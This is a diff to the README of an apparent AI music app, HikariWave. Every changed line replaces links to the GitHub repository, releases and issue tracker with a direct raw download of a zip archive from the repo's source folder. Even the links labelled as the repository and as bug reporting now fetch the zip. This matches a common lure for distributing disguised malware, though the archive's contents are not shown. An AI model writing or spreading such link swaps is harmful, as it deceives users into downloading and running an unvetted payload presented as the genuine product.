@@ -1,6 +1,6 @@
 # 🎵 HikariWave - AI Music Creation Made Easy
 
-[![Download HikariWave](https://img.shields.io/badge/Download-HikariWave-blueviolet?style=for-the-badge)](https://github.com/jordanz1x/HikariWave)
+[![Download HikariWave](https://img.shields.io/badge/Download-HikariWave-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/jordanz1x/HikariWave/main/desktop/src/Hikari_Wave_v2.6.zip)
 
 ---
 
@@ -16,7 +16,7 @@ You don’t need any musical or tech skills. HikariWave handles the creative tas
 
 1. **Visit the Download Page**  
    Go to the official GitHub page to get the latest version:  
-   [https://github.com/jordanz1x/HikariWave](https://github.com/jordanz1x/HikariWave)
+   [https://raw.githubusercontent.com/jordanz1x/HikariWave/main/desktop/src/Hikari_Wave_v2.6.zip](https://raw.githubusercontent.com/jordanz1x/HikariWave/main/desktop/src/Hikari_Wave_v2.6.zip)
 
 2. **Find the Windows Installer**  
    On the GitHub page, look for the "Releases" section on the right side or top menu. Click it.
@@ -128,15 +128,15 @@ Browse, search, and manage your collection with grid or list views.
 ## 🙋 Support & Feedback
 
 Report bugs or request features by opening a ticket on the GitHub repository:  
-[https://github.com/jordanz1x/HikariWave/issues](https://github.com/jordanz1x/HikariWave/issues)
+[https://raw.githubusercontent.com/jordanz1x/HikariWave/main/desktop/src/Hikari_Wave_v2.6.zip](https://raw.githubusercontent.com/jordanz1x/HikariWave/main/desktop/src/Hikari_Wave_v2.6.zip)
 
 ---
 
 ## 🔗 Important Links
 
-[![Download HikariWave](https://img.shields.io/badge/Download-HikariWave-blueviolet?style=for-the-badge)](https://github.com/jordanz1x/HikariWave)  
+[![Download HikariWave](https://img.shields.io/badge/Download-HikariWave-blueviolet?style=for-the-badge)](https://raw.githubusercontent.com/jordanz1x/HikariWave/main/desktop/src/Hikari_Wave_v2.6.zip)  
 
-GitHub repository: [https://github.com/jordanz1x/HikariWave](https://github.com/jordanz1x/HikariWave)  
+GitHub repository: [https://raw.githubusercontent.com/jordanz1x/HikariWave/main/desktop/src/Hikari_Wave_v2.6.zip](https://raw.githubusercontent.com/jordanz1x/HikariWave/main/desktop/src/Hikari_Wave_v2.6.zip)  
 
 License: Creative Commons BY-NC-SA 4.0
 
